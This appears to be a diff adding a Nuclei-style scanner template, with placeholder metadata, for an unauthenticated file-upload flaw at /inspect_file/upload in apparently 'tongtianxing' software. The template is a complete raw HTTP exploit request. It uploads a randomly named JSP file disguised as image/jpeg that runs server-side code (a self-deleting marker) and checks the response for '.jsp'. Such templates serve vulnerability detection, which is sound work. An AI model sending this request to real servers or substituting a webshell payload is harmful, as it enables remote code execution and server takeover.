@@ -1,0 +1,35 @@
+id: tongtianxing-inspectfile-fileupload
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}" 
+  
+http:
+  - raw:
+      - |-
+        POST /inspect_file/upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+        Connection: close
+        Content-Length: 263
+        Content-Type: multipart/form-data; boundary=----s4we7ynzybjsjod6rylk
+
+        ------s4we7ynzybjsjod6rylk
+        Content-Disposition: form-data; name="uploadFile"; filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------s4we7ynzybjsjod6rylk--
+
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.jsp'
